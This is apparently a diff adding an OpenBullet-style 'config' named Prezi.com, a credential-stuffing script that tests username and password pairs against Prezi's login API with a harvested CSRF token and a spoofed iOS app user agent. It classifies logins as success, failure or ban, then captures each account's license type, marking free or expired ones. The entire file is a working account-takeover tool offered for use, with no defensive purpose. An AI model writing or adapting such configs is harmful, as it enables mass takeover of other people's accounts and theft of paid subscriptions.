@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "Prezi.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-25T19:33:52.774801-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Alphalete#4827",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://prezi.com/api/v2/auth/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(csrftoken)>" LR "" "" -> VAR "Token" 
+
+REQUEST POST "https://prezi.com/api/v2/auth/login/" 
+  CONTENT "password=<PASS>&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: csrftoken=<Token>" 
+  HEADER "User-Agent: Prezi/4.11.1 CFNetwork iOS" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Csrftoken: <Token>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "The e-mail or password you entered is incorrect" 
+  KEYCHAIN Failure OR 
+    KEY "The e-mail or password you entered is incorrect" 
+  KEYCHAIN Ban OR 
+    KEY "{\"error_code\": 1," 
+
+REQUEST POST "https://prezi.com/api/desktop/license/json/" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Prezi/4.11.1 CFNetwork iOS" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Csrftoken: <Token>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "license_name\": \"Public\", " 
+    KEY "license_is_expired\": true" 
+
+PARSE "<SOURCE>" LR "license_name\": \"" "\"," CreateEmpty=FALSE -> CAP "License" 
+
